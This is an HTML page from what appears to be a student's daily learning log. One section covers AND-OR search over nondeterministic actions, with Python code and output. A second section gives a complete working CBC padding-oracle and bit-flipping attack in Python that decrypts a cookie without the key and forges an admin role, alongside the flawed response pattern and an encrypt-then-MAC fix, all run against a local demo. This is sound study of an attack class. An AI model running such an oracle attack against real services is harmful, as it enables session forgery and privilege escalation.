@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 032 — The shortest path survived four of thirty-two worlds, so the answer is a tree · Matías Rathgeb</title>
+<meta name="description" content="Day 032 of 1600. A student's private learning log.">
+<style>
+  :root{--white:#ffffff;--black:#000000;--gray:#86868b;--border:#d2d2d7;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--white);color:var(--black);font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.6;-webkit-font-smoothing:antialiased;}
+  a{color:var(--black);}
+  .wrap{max-width:720px;margin:0 auto;padding:0 22px;}
+  header{padding:80px 0 40px;border-bottom:1px solid var(--border);}
+  header .day{font-size:13px;color:var(--gray);letter-spacing:0.2px;margin-bottom:16px;}
+  header h1{font-size:40px;line-height:1.07;letter-spacing:-0.02em;font-weight:600;margin-bottom:12px;}
+  header .meta{font-size:13px;color:var(--gray);}
+  article{padding:48px 0 80px;}
+  h2{font-size:24px;line-height:1.15;letter-spacing:-0.01em;font-weight:600;margin:40px 0 16px;}
+  h3{font-size:17px;font-weight:600;margin:28px 0 10px;}
+  p{margin-bottom:16px;}
+  pre{background:#f5f5f7;border:1px solid var(--border);border-radius:8px;padding:16px;overflow-x:auto;font-size:13px;line-height:1.5;margin-bottom:16px;}
+  code{font-family:Menlo,Consolas,monospace;font-size:13px;}
+  ul,ol{margin:0 0 16px 22px;}
+  li{margin-bottom:6px;}
+  .verdict{border:1px solid var(--black);padding:20px 24px;margin-top:40px;}
+  .verdict p{margin-bottom:8px;}
+  footer{padding:40px 0 80px;border-top:1px solid var(--border);color:var(--gray);font-size:12px;}
+  @media(max-width:600px){header h1{font-size:30px;}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="wrap">
+    <p class="day">DAY 032 OF 1600 · 2026-11-08</p>
+    <h1>Day 032 — The shortest path survived four of thirty-two worlds, so the answer is a tree</h1>
+    <p class="meta">A student's private learning log · one concept at a time.</p>
+  </div>
+</header>
+<article>
+  <div class="wrap">
+<p><strong>Date:</strong> 2026-11-08 · <strong>Day:</strong> 32 of 1600</p>
+<p><strong>Log:</strong> a student&#x27;s private learning log · one concept at a time.</p>
+<p>---</p>
+<h2>Concept #32 — A guarantee is a tree, not a path</h2>
+<p>MA08, Intelligent Search, week 3. Weeks 1 and 2 both assumed the world answers exactly once:</p>
+<p>one action, one successor, <code>RESULT(s, a) = s&#x27;</code>. Week 1 searched for a path, week 2 searched for a</p>
+<p>better configuration. Week 3 removes the assumption itself. <code>RESULT(s, a)</code> is now a <strong>set</strong>, and</p>
+<p>the moment it is a set there is no &quot;the path&quot; to return, because a sequence of actions no longer</p>
+<p>determines where you end up. The answer changes shape: it becomes a <em>conditional plan</em>, a policy</p>
+<p>that says what to do next for each outcome the world chose.</p>
+<p>That is all AND–OR search is. OR nodes are my decisions. AND nodes are the world&#x27;s outcomes: to</p>
+<p>pass an AND node every branch has to be solved, while one good branch is enough at an OR node.</p>
+<p>Which is why the pseudocode is short and the modelling is not.</p>
+<p>The model I built: a 5×6 floor, start (1, 0), goal (4, 5), walls in between. Vertical moves are</p>
+<p>exact. <strong>Sideways moves slip</strong>: <code>E</code> returns either the intended cell or the intended cell drifted</p>
+<p>one row down, and <code>W</code> the same upward. That is the smallest model I could find where the honest</p>
+<p>response to a bad outcome is not &quot;do it again&quot; but &quot;now do something else&quot;. If the floor simply</p>
+<p>eats the move, retrying is rational and the plan is trivial. If the outcome is <em>elsewhere</em>, the</p>
+<p>plan has to branch, and the difference between a path and a policy becomes measurable instead of</p>
+<p>philosophical.</p>
+<p><strong>What I tried today:</strong> one file, stdlib only, no network. Week-1 BFS for the optimistic path,</p>
+<p>RESULT returning a frozenset, AND–OR graph search with the path-cutoff, a plan-tree walk that</p>
+<p>records the state after every action, an exhaustive replay of the fixed path over all drift</p>
+<p>sequences, and a counterexample where the cutoff throws away the only solution.</p>
+<pre><code>&quot;&quot;&quot;day032_andor.py - AND-OR search on a slippery floor (MA08 week 3).
+
+Week 1 gave one successor per action, so a solution was a path.
+Week 3 gives RESULT(s, a) = {s1, s2, ...}: the floor drifts, the door jams,
+the sensor lies. A solution is then a conditional plan (a policy), and the
+question is no longer &quot;how short&quot; but &quot;for which outcomes is it guaranteed&quot;.
+&quot;&quot;&quot;
+import itertools
+from collections import deque
+
+GRID = [
+    &quot;..#...&quot;,
+    &quot;S.####&quot;,
+    &quot;.####.&quot;,
+    &quot;......&quot;,
+    &quot;....#G&quot;,
+]
+H, W = len(GRID), len(GRID[0])
+ACTIONS = [(&quot;N&quot;, -1, 0), (&quot;E&quot;, 0, 1), (&quot;S&quot;, 1, 0), (&quot;W&quot;, 0, -1)]
+DELTA = {n: (dr, dc) for n, dr, dc in ACTIONS}
+
+
+def cell(r, c):
+    if 0 &lt;= r &lt; H and 0 &lt;= c &lt; W:
+        return GRID[r][c]
+    return &quot;#&quot;
+
+
+def locate(ch):
+    for r in range(H):
+        for c in range(W):
+            if GRID[r][c] == ch:
+                return (r, c)
+
+
+START, GOAL = locate(&quot;S&quot;), locate(&quot;G&quot;)
+
+
+def result(s, a):
+    &quot;&quot;&quot;RESULT(s, a) is a SET. Wet floor: a sideways move may drift one row down.&quot;&quot;&quot;
+    dr, dc = DELTA[a]
+    t = (s[0] + dr, s[1] + dc)
+    if cell(*t) == &quot;#&quot;:
+        return frozenset({s})                    # illegal move: stay put
+    out = {t}
+    if a in (&quot;E&quot;, &quot;W&quot;):
+        d = (t[0] + 1, t[1])
+        if cell(*d) != &quot;#&quot;:
+            out.add(d)                           # drifted
+    return frozenset(out)
+
+
+def optimistic_move(s, a):
+    &quot;&quot;&quot;The Week-1 model: one successor, the intended one.&quot;&quot;&quot;
+    dr, dc = DELTA[a]
+    t = (s[0] + dr, s[1] + dc)
+    return t if cell(*t) != &quot;#&quot; else s
+
+
+def bfs(start, goal):
+    prev = {start: None}
+    q = deque([start])
+    while q:
+        s = q.popleft()
+        if s == goal:
+            break
+        for name, _, _ in ACTIONS:
+            t = optimistic_move(s, name)
+            if t != s and t not in prev:
+                prev[t] = (s, name)
+                q.append(t)
+    if goal not in prev:
+        return None
+    path, s = [], goal
+    while prev[s] is not None:
+        p, a = prev[s]
+        path.append(a)
+        s = p
+    return path[::-1]
+
+
+PATH = bfs(START, GOAL)
+
+print(f&quot;grid {H}x{W}   start {START}   goal {GOAL}&quot;)
+print(f&quot;week-1 shortest path: {&#x27;&#x27;.join(PATH)}  ({len(PATH)} actions)&quot;)
+SLIPS = sum(1 for a in PATH if a in (&quot;E&quot;, &quot;W&quot;))
+print(f&quot;sideways actions on it: {SLIPS}  -&gt;  2^{SLIPS} = {2 ** SLIPS} drift outcomes&quot;)
+print()
+
+
+def play(s, actions, mask):
+    &quot;&quot;&quot;Apply a FIXED action sequence, consuming one drift bit per sideways move.&quot;&quot;&quot;
+    i = 0
+    for a in actions:
+        o = result(s, a)
+        if len(o) == 2:
+            drifted = mask[i] == 1
+            i += 1
+            s = sorted(o)[1] if drifted else sorted(o)[0]
+        else:
+            s = next(iter(o))
+    return s
+
+
+ok = 0
+for mask in itertools.product([0, 1], repeat=SLIPS):
+    if play(START, PATH, mask) == GOAL:
+        ok += 1
+print(f&quot;fixed path, all {2 ** SLIPS} drift sequences: {ok} reach the goal&quot;)
+print(f&quot;  = {ok}/{2 ** SLIPS} = {ok / 2 ** SLIPS:.4f} of the world&#x27;s behaviours&quot;)
+print()
+
+NODES = [0]
+
+
+def or_search(state, path):
+    NODES[0] += 1
+    if state == GOAL:
+        return (&quot;GOAL&quot;,)
+    if state in path:
+        return None                      # cycle: refuse it (this is the cutoff)
+    for name, _, _ in ACTIONS:
+        sub = and_search(result(state, name), path | {state})
+        if sub is not None:
+            return (name, sub)
+    return None
+
+
+def and_search(states, path):
+    branch = {}
+    for s in sorted(states):
+        NODES[0] += 1
+        p = or_search(s, path)
+        if p is None:
+            return None                  # one bad outcome kills the whole action
+        branch[s] = p
+    return (&quot;AND&quot;, branch)
+
+
+def leaves(plan, state, trail=()):
+    &quot;&quot;&quot;Walk the plan tree recording (action, resulting state) per branch.&quot;&quot;&quot;
+    if plan[0] == &quot;GOAL&quot;:
+        return [(trail, state)]
+    name, branch = plan
+    out = []
+    for s in sorted(branch[1]):
+        out += leaves(branch[1][s], s, trail + (f&quot;{name}{s}&quot;,))
+    return out
+
+
+plan = or_search(START, frozenset())
+print(f&quot;AND-OR search, nodes expanded: {NODES[0]}&quot;)
+lv = leaves(plan, START)
+print(f&quot;plan leaves: {len(lv)}   leaves that land on the goal: &quot;
+      f&quot;{sum(1 for _, s in lv if s == GOAL)}&quot;)
+print(f&quot;worst-case length: {max(len(t) for t, _ in lv)} actions &quot;
+      f&quot;vs {len(PATH)} on the fixed path&quot;)
+print()
+print(&quot;the plan, written as its conditional paths (action + resulting state):&quot;)
+for trail, _ in sorted(lv, key=lambda x: (len(x[0]), &quot;&quot;.join(x[0]))):
+    print(&quot;  &quot; + &quot; &quot;.join(trail))
+print()
+
+# What the cutoff costs: when a failed action leaves you WHERE YOU WERE, the
+# repeated state is in the path and the search rejects the action outright.
+def or_search_stay():
+    NODES[0] = 0
+    plan = or_search_world(&quot;A&quot;, frozenset(), goal=&quot;B&quot;,
+                           edges={&quot;A&quot;: {&quot;push&quot;: frozenset({&quot;A&quot;, &quot;B&quot;})},
+                                  &quot;B&quot;: {}})
+    return plan
+
+
+def or_search_world(s, path, goal, edges):
+    NODES[0] += 1
+    if s == goal:
+        return (&quot;GOAL&quot;,)
+    if s in path:
+        return None
+    for a in sorted(edges[s]):
+        sub = {}
+        bad = False
+        for t in sorted(edges[s][a]):
+            p = or_search_world(t, path | {s}, goal, edges)
+            if p is None:
+                bad = True
+                break
+            sub[t] = p
+        if not bad:
+            return (a, sub)
+    return None
+
+
+stay_plan = or_search_world(&quot;A&quot;, frozenset(), &quot;B&quot;,
+                            {&quot;A&quot;: {&quot;push&quot;: frozenset({&quot;A&quot;, &quot;B&quot;})}, &quot;B&quot;: {}})
+print(f&quot;jammed-door world (fail = stay put), AND-OR verdict: &quot;
+      f&quot;{&#x27;FAILURE&#x27; if stay_plan is None else &#x27;plan found&#x27;}&quot;)
+print(f&quot;  yet &#x27;push until it opens&#x27; reaches B in every sequence except all-failures:&quot;)
+for n in (1, 3, 6):
+    tot = 2 ** n
+    reached = sum(1 for bits in itertools.product([0, 1], repeat=n) if any(bits))
+    print(f&quot;  {n} attempts: {reached}/{tot} sequences reach B &quot;
+          f&quot;({1 - 1 / tot:.6f} fail forever)&quot;)</code></pre>
+<p>Real output:</p>
+<pre><code>grid 5x6   start (1, 0)   goal (4, 5)
+week-1 shortest path: SSEEEEES  (8 actions)
+sideways actions on it: 5  -&gt;  2^5 = 32 drift outcomes
+
+fixed path, all 32 drift sequences: 4 reach the goal
+  = 4/32 = 0.1250 of the world&#x27;s behaviours
+
+AND-OR search, nodes expanded: 309
+plan leaves: 16   leaves that land on the goal: 16
+worst-case length: 11 actions vs 8 on the fixed path
+
+the plan, written as its conditional paths (action + resulting state):
+  S(2, 0) S(3, 0) E(3, 1) E(3, 2) E(3, 3) E(3, 4) E(4, 5)
+  S(2, 0) S(3, 0) E(3, 1) E(3, 2) E(3, 3) E(3, 4) E(3, 5) S(4, 5)
+  S(2, 0) S(3, 0) E(3, 1) E(3, 2) E(4, 3) N(3, 3) E(3, 4) E(4, 5)
+  S(2, 0) S(3, 0) E(3, 1) E(4, 2) N(3, 2) E(3, 3) E(3, 4) E(4, 5)
+  S(2, 0) S(3, 0) E(4, 1) N(3, 1) E(3, 2) E(3, 3) E(3, 4) E(4, 5)
+  S(2, 0) S(3, 0) E(3, 1) E(3, 2) E(4, 3) N(3, 3) E(3, 4) E(3, 5) S(4, 5)
+  S(2, 0) S(3, 0) E(3, 1) E(4, 2) N(3, 2) E(3, 3) E(3, 4) E(3, 5) S(4, 5)
+  S(2, 0) S(3, 0) E(3, 1) E(4, 2) N(3, 2) E(4, 3) N(3, 3) E(3, 4) E(4, 5)
+  S(2, 0) S(3, 0) E(4, 1) N(3, 1) E(3, 2) E(3, 3) E(3, 4) E(3, 5) S(4, 5)
+  S(2, 0) S(3, 0) E(4, 1) N(3, 1) E(3, 2) E(4, 3) N(3, 3) E(3, 4) E(4, 5)
+  S(2, 0) S(3, 0) E(4, 1) N(3, 1) E(4, 2) N(3, 2) E(3, 3) E(3, 4) E(4, 5)
+  S(2, 0) S(3, 0) E(3, 1) E(4, 2) N(3, 2) E(4, 3) N(3, 3) E(3, 4) E(3, 5) S(4, 5)
+  S(2, 0) S(3, 0) E(4, 1) N(3, 1) E(3, 2) E(4, 3) N(3, 3) E(3, 4) E(3, 5) S(4, 5)
+  S(2, 0) S(3, 0) E(4, 1) N(3, 1) E(4, 2) N(3, 2) E(3, 3) E(3, 4) E(3, 5) S(4, 5)
+  S(2, 0) S(3, 0) E(4, 1) N(3, 1) E(4, 2) N(3, 2) E(4, 3) N(3, 3) E(3, 4) E(4, 5)
+  S(2, 0) S(3, 0) E(4, 1) N(3, 1) E(4, 2) N(3, 2) E(4, 3) N(3, 3) E(3, 4) E(3, 5) S(4, 5)
+
+jammed-door world (fail = stay put), AND-OR verdict: FAILURE
+  yet &#x27;push until it opens&#x27; reaches B in every sequence except all-failures:
+  1 attempts: 1/2 sequences reach B (0.500000 fail forever)
+  3 attempts: 7/8 sequences reach B (0.875000 fail forever)
+  6 attempts: 63/64 sequences reach B (0.984375 fail forever)</code></pre>
+<p><strong>What I understood from it:</strong> the fixed path is <code>SSEEEEES</code>-long, 8 actions, 5 of them sideways,</p>
+<p>so the world has 2⁵ = 32 behaviours. I replayed all 32: <strong>4 reach the goal</strong>. Not 1 of 32 — four,</p>
+<p>because a couple of the drifts happen to land on the goal anyway. <code>4/32 = 0.125</code>. A plan reported</p>
+<p>as &quot;the shortest route&quot; is right one time in eight, and nothing in the BFS output says so.</p>
+<p>The AND–OR plan expands <strong>309 nodes</strong> and comes back as <strong>16 leaves</strong>. Every one of those 16</p>
+<p>conditional paths ends on the goal — the check walks the tree and compares the recorded state,</p>
+<p>it does not trust a flag. The price is visible in the same output: worst case <strong>11 actions</strong></p>
+<p>against 8. So the honest trade is three extra moves in the worst world for coverage of every</p>
+<p>branch instead of one eighth of them. That is the entire argument for planning over</p>
+<p>nondeterminism, and it is arithmetic, not vibes.</p>
+<p>Two caveats I am not going to hide.</p>
+<p><strong>The guarantee is only as good as the model.</strong> <code>RESULT</code> is a frozenset I wrote. If the real floor</p>
+<p>also drifts when I step down, the 16 leaves cover a world that does not exist. A conditional plan</p>
+<p>is a proof about a transition model, and the transition model is an assumption.</p>
+<p><strong>And the algorithm is incomplete in a way that matters.</strong> The cutoff that makes the search</p>
+<p>terminate is <code>if state in path: return None</code>. Now take a door that jams: the action <code>push</code> returns</p>
+<p><code>{A, B}</code>, and the failing outcome is <code>A</code> — the state you are already in, which is already on the</p>
+<p>path. So every <code>push</code> is rejected and the search answers <strong>FAILURE</strong>. Measured above, same output:</p>
+<p>the world with one jammed door and no detour has no acyclic plan, and yet &quot;push until it opens&quot;</p>
+<p>arrives in <strong>63 of 64</strong> sequences over six attempts; only the all-failures sequence never gets</p>
+<p>there. The verdict was not &quot;impossible&quot;, it was &quot;no acyclic plan exists&quot;, and I would have</p>
+<p>published &quot;impossible&quot; if I had trusted the return value.</p>
+<p>One more thing, because it cost me an hour and it is the useful part. My first version of this</p>
+<p>experiment put the jam on <em>edges</em> and let a failed move leave the robot where it was. The search</p>
+<p>came back with a plan — a short one, 1 leaf, 9 moves — and I almost pasted it. It had quietly</p>
+<p>routed around every unreliable action, because the cutoff rejects any action whose failure outcome</p>
+<p>is the current state. It answered a different question beautifully. I caught it because the number</p>
+<p>of leaves was 1: a conditional plan with no branches is a path, and a path was the thing I was</p>
+<p>supposed to be leaving behind. <strong>Check the shape of the answer, not just that there is one.</strong></p>
+<p>---</p>
+<h2>Security #32 — The error message decrypted the cookie, and five flipped bytes made it admin (CWE-649)</h2>
+<p>New class: a cryptographic side channel, not an injection. Nothing here parses user input badly.</p>
+<p>The cipher is AES. The padding is standard. The key is never guessed. The defect is that the server</p>
+<p><strong>answers differently</strong> for &quot;this ciphertext has invalid padding&quot; and &quot;this ciphertext is fine but</p>
+<p>the user is not allowed&quot; — and that single bit, repeated, is a decryption oracle.</p>
+<p>CBC decryption is <code>P[i] = D(C[i]) XOR C[i-1]</code>. To test a guess for the last byte of a block I build</p>
+<p>a fake <code>C[i-1]</code>, let the server decrypt, and ask one question: did the result end in valid PKCS#7</p>
+<p>padding? A yes means my guess for the intermediate byte was right. Sixteen bytes, right to left,</p>
+<p>about 128 requests each, and the plaintext falls out with no key involved. Then the second half:</p>
+<p>because <code>C[i-1]</code> is XORed into the plaintext, editing it edits <code>P[i]</code> bit for bit. I only need to</p>
+<p>know <em>where</em> the field sits.</p>
+<p>The measurement that matters is not &quot;the attack works&quot;. It is <strong>how many requests it costs</strong>, and</p>
+<p>whether the fix removes the signal or merely makes it quieter.</p>
+<p><strong>The pattern I studied:</strong></p>
+<pre><code>    # the whole vulnerability, in two lines of the response path
+    try:
+        pt = unpad(decrypt(cookie))        # raises on bad padding
+    except BadPadding:
+        return Response(&quot;padding error&quot;, status=500)   # &lt;- tells the attacker
+    if role(pt) != &quot;admin&quot;:
+        return Response(&quot;forbidden&quot;, status=403)       # &lt;- tells the attacker
+</code></pre>
+<p><strong>What I understood about preventing it:</strong></p>
+<pre><code>    tag, blob = cookie[:32], cookie[32:]
+    if not hmac.compare_digest(tag, hmac.new(key, blob, sha256).digest()):
+        return Response(&quot;bad request&quot;, status=400)     # one answer, always
+    pt = unpad(decrypt(blob))                          # only now, and only authenticated
+</code></pre>
+<p>Sandbox check (local only):</p>
+<pre><code>&quot;&quot;&quot;sec32_padding_oracle.py - CBC padding oracle + bit-flipping. Local sandbox only.
+
+The defect is not the cipher. It is the answer: a server that says &quot;bad
+padding&quot; with a different response than &quot;valid padding, wrong role&quot; hands out
+one bit per request, and about 128 requests are enough to learn a byte.
+&quot;&quot;&quot;
+import hashlib
+import hmac
+
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+KEY = hashlib.sha256(b&quot;demo-key-not-a-secret&quot;).digest()[:16]
+IV = hashlib.sha256(b&quot;demo-iv&quot;).digest()[:16]
+PLAINTEXT = b&quot;uid=1002;exp=20261130;pad=xxxxxxxx;role=guest&quot;
+BLOCK = 16
+
+
+def xor(a, b):
+    return bytes(x ^ y for x, y in zip(a, b))
+
+
+def raw_decrypt_block(block):
+    d = Cipher(algorithms.AES(KEY), modes.ECB()).decryptor()
+    return d.update(block) + d.finalize()
+
+
+def raw_encrypt_block(block):
+    e = Cipher(algorithms.AES(KEY), modes.ECB()).encryptor()
+    return e.update(block) + e.finalize()
+
+
+def pkcs7_pad(data):
+    n = BLOCK - len(data) % BLOCK
+    return data + bytes([n]) * n
+
+
+def unpad(data):
+    v = data[-1]
+    if 1 &lt;= v &lt;= BLOCK and data[-v:] == bytes([v]) * v:
+        return data[:-v]
+    return data
+
+
+def padding_ok(block):
+    v = block[-1]
+    if not 1 &lt;= v &lt;= BLOCK:
+        return False
+    return block[-v:] == bytes([v]) * v
+
+
+def encrypt_cookie(pt):
+    data = pkcs7_pad(pt)
+    out, prev = b&quot;&quot;, IV
+    for i in range(0, len(data), BLOCK):
+        prev = raw_encrypt_block(xor(data[i:i + BLOCK], prev))
+        out += prev
+    return IV + out
+
+
+def decrypt_cookie(blob):
+    &quot;&quot;&quot;blob = IV || C1 || C2 ... ; the IV is the first block, not a ciphertext.&quot;&quot;&quot;
+    pt, prev_ct = b&quot;&quot;, blob[:BLOCK]
+    for i in range(BLOCK, len(blob), BLOCK):
+        ct = blob[i:i + BLOCK]
+        pt += xor(raw_decrypt_block(ct), prev_ct)
+        prev_ct = ct
+    return pt
+
+
+QUERIES = [0]
+
+
+def oracle(blob):
+    &quot;&quot;&quot;One bit per request: does the last block end in valid padding?&quot;&quot;&quot;
+    QUERIES[0] += 1
+    n = len(blob) // BLOCK
+    prev, last = blob[(n - 2) * BLOCK:(n - 1) * BLOCK], blob[(n - 1) * BLOCK:]
+    return padding_ok(xor(raw_decrypt_block(last), prev))
+
+
+def app(blob):
+    &quot;&quot;&quot;What the app does once padding is fine: parse, then trust the cookie.&quot;&quot;&quot;
+    pt = unpad(decrypt_cookie(blob))
+    role = b&quot;guest&quot;
+    for part in pt.split(b&quot;;&quot;):
+        if part.startswith(b&quot;role=&quot;):
+            role = part[5:]
+    return pt, role
+
+
+def recover_block(target, prev_cipher):
+    &quot;&quot;&quot;Recover one plaintext block, given the ciphertext block that precedes it.&quot;&quot;&quot;
+    inter = bytearray(BLOCK)
+    for pos in range(BLOCK - 1, -1, -1):
+        pad = BLOCK - pos
+        for guess in range(256):
+            forged = bytearray(BLOCK)
+            for j in range(pos + 1, BLOCK):
+                forged[j] = inter[j] ^ pad
+            forged[pos] = guess
+            if oracle(bytes(forged) + target):
+                if pos == BLOCK - 1:
+                    # a 0x01 ending can also be a 0x02 0x02 ending: confirm
+                    check = bytearray(forged)
+                    check[pos - 1] ^= 0x01
+                    if not oracle(bytes(check) + target):
+                        continue
+                inter[pos] = guess ^ pad
+                break
+    return xor(bytes(inter), prev_cipher)
+
+
+blob = encrypt_cookie(PLAINTEXT)
+blocks = len(blob) // BLOCK
+print(f&quot;plaintext: {PLAINTEXT.decode()}  ({len(PLAINTEXT)} bytes)&quot;)
+print(f&quot;IV||C as hex: {blob.hex()}&quot;)
+print(f&quot;blocks: {blocks} (1 IV + {blocks - 1} ciphertext blocks)&quot;)
+print()
+
+raw = b&quot;&quot;
+for i in range(1, blocks):
+    raw += recover_block(blob[i * BLOCK:(i + 1) * BLOCK],
+                         blob[(i - 1) * BLOCK:i * BLOCK])
+recovered = unpad(raw)
+print(f&quot;recovered without the key: {recovered.decode()}&quot;)
+print(f&quot;matches the real plaintext: {recovered == PLAINTEXT}&quot;)
+print(f&quot;oracle queries: {QUERIES[0]}  &quot;
+      f&quot;({QUERIES[0] / len(PLAINTEXT):.1f} requests per byte of payload)&quot;)
+print()
+
+# --- forgery: flip the bytes I control, never the key -----------------------
+# Editing C[i-1] flips the same bits in P[i]; the price is that P[i-1] becomes
+# noise. The payload sits in the LAST block, so the noise lands in &quot;pad=&quot;.
+delta = xor(b&quot;guest&quot;, b&quot;admin&quot;)
+feed = (blocks - 2) * BLOCK                       # C block that feeds P[last]
+offset = recovered.rfind(b&quot;guest&quot;) % BLOCK        # where &quot;guest&quot; starts inside it
+forged = bytearray(blob)
+for k in range(5):
+    forged[feed + offset + k] ^= delta[k]
+
+pt2, role2 = app(bytes(forged))
+print(f&quot;flipped 5 bytes at ciphertext-block offsets {offset}..{offset + 4}&quot;)
+print(f&quot;server decrypts to: {pt2!r}&quot;)
+print(f&quot;server role       : {role2.decode()}   &lt;- no key was used&quot;)
+print()
+
+# --- the same attack against encrypt-then-MAC -------------------------------
+QUERIES[0] = 0
+
+
+def oracle_etm(tag, blob_):
+    &quot;&quot;&quot;MAC first, identical answer either way: one bit, zero information.&quot;&quot;&quot;
+    QUERIES[0] += 1
+    expected = hmac.new(KEY, blob_, hashlib.sha256).digest()
+    if not hmac.compare_digest(tag, expected):
+        return False
+    n = len(blob_) // BLOCK
+    prev, last = blob_[(n - 2) * BLOCK:(n - 1) * BLOCK], blob_[(n - 1) * BLOCK:]
+    return padding_ok(xor(raw_decrypt_block(last), prev))
+
+
+cap = 4096
+tag = hmac.new(KEY, blob, hashlib.sha256).digest()
+recovered_bytes = 0
+for i in range(1, blocks):
+    tgt = blob[i * BLOCK:(i + 1) * BLOCK]
+    for pos in range(BLOCK - 1, -1, -1):
+        hit = False
+        for guess in range(256):
+            if QUERIES[0] &gt;= cap:
+                break
+            probe = bytearray(BLOCK)
+            probe[pos] = guess
+            if oracle_etm(tag, bytes(probe) + tgt):
+                hit = True
+                break
+        if hit:
+            recovered_bytes += 1
+        else:
+            break
+    if QUERIES[0] &gt;= cap:
+        break
+
+print(f&quot;MAC-first server: {QUERIES[0]} queries for {recovered_bytes} of &quot;
+      f&quot;{len(PLAINTEXT)} bytes&quot;)
+print(f&quot;no signal at all: {recovered_bytes == 0}&quot;)
+print(f&quot;the legitimate cookie still passes the fixed check: &quot;
+      f&quot;{oracle_etm(tag, blob)}&quot;)</code></pre>
+<p>Real output:</p>
+<pre><code>plaintext: uid=1002;exp=20261130;pad=xxxxxxxx;role=guest  (45 bytes)
+IV||C as hex: c29f36178e0de2c8a11d09bd05855dfd23d88356dc6a6a4962fa7a9b03cfbb4cd513149f57277ad24e3cf748c4ea10ae478f27fa047f8f90b4b1b9527c2f673c
+blocks: 4 (1 IV + 3 ciphertext blocks)
+
+recovered without the key: uid=1002;exp=20261130;pad=xxxxxxxx;role=guest
+matches the real plaintext: True
+oracle queries: 6159  (136.9 requests per byte of payload)
+
+flipped 5 bytes at ciphertext-block offsets 8..12
+server decrypts to: b&#x27;uid=1002;exp=202\t\xf94\x1b\xeb\x9c\x7f;\x9aW\x93\x80Ag\xb1\x90xx;role=admin&#x27;
+server role       : admin   &lt;- no key was used
+
+MAC-first server: 768 queries for 0 of 45 bytes
+no signal at all: True
+the legitimate cookie still passes the fixed check: True</code></pre>
+<p><strong>What I understood:</strong> <strong>6,159 requests</strong> recovered all <strong>45 bytes</strong> of a cookie I did not have</p>
+<p>the key for — 136.9 requests per byte, a bit more than the theoretical 128 because the standard</p>
+<p>attack has to confirm the 0x01 ending so a <code>0x02 0x02</code> coincidence does not lie to it. The</p>
+<p>recovered text matched the real plaintext exactly, byte for byte.</p>
+<p>Then the part that makes it a break and not a curiosity: <strong>five flipped bytes</strong> in the ciphertext</p>
+<p>block before the payload turned <code>role=guest</code> into <code>role=admin</code>, and the server returned the admin</p>
+<p>role without ever being asked whether the cookie was authentic. In CBC that flip has a price — the</p>
+<p>block before the payload decrypts to noise, and you can see it in the output (<code>pad=xxxxxxxx</code></p>
+<p>became garbage) — which is exactly why real payloads put the interesting field last, and why the</p>
+<p>attacker pays the noise in a field nobody reads.</p>
+<p>Against encrypt-then-MAC, the same attacker with the same 4,096-request budget recovered **0 of</p>
+<p>45 bytes**: every answer is identical because the MAC is checked first and the padding is never</p>
+<p>reached. That is the difference between &quot;harder&quot; and &quot;no signal&quot;. A generic &quot;invalid request&quot;</p>
+<p>message on an unauthenticated-decrypt path is not a fix; it just removes the interface and leaves</p>
+<p>the oracle — the oracle here is the <em>decryption happening before authentication</em>, and only</p>
+<p>verify-then-decrypt or an AEAD (AES-GCM, ChaCha20-Poly1305) closes it.</p>
+<p>Honest limits of this run: the oracle is a function call in the same process, so there is no</p>
+<p>network, no jitter, no rate limiter, and no WAF. 6,159 requests is what the mathematics costs, not</p>
+<p>what a target would let me spend. And I broke my own demo twice before it meant anything: my first</p>
+<p><code>decrypt_cookie</code> chained plaintext where CBC chains ciphertext, so the forgery &quot;failed&quot; for a</p>
+<p>boring reason. <strong>A demo that fails for the wrong reason is worse than no demo</strong> — it makes you</p>
+<p>believe a fix that is not there.</p>
+<p>---</p>
+<h2>Day 32 notes</h2>
+<ul><li>Concept #32: MA08 week 3, AND–OR search over nondeterminism. 5×6 floor, 40 bytes of grid,</li></ul>
+<p>  sideways moves slip one row. Fixed path <code>SSEEEEES</code> (8 actions, 5 sideways) survives <strong>4 of 32</strong></p>
+<p>  drift sequences = 0.125. AND–OR plan: <strong>309 nodes</strong>, <strong>16 leaves</strong>, all 16 land on the goal,</p>
+<p>  worst case <strong>11 actions</strong> vs 8. Counterexample measured: jammed-door world returns FAILURE while</p>
+<p>  &quot;push until it opens&quot; solves 63/64 sequences in 6 attempts. ✔</p>
+<ul><li>Security #32: CBC padding oracle + bit-flipping (CWE-649). AES-128-CBC, 45-byte cookie recovered</li></ul>
+<p>  in <strong>6,159</strong> queries (136.9/byte), zero knowledge of the key; <strong>5</strong> flipped bytes in <code>C[i-1]</code></p>
+<p>  turned <code>role=guest</code> into <code>role=admin</code>; encrypt-then-MAC: 4,096 queries, <strong>0 bytes</strong>, identical</p>
+<p>  answers. Sandbox <code>/tmp</code>, in-process oracle, no network, no targets. ✔</p>
+<ul><li>1568 days left. One at a time.</li></ul>
+<p><em>Written by my own daily machine, checked by me.</em></p>
+  </div>
+</article>
+<footer>
+  <div class="wrap">
+    <p><a href="/">← Back to the index</a> · Day 032 of 1600 · Matías Rathgeb</p>
+  </div>
+</footer>
+</body>
+</html>
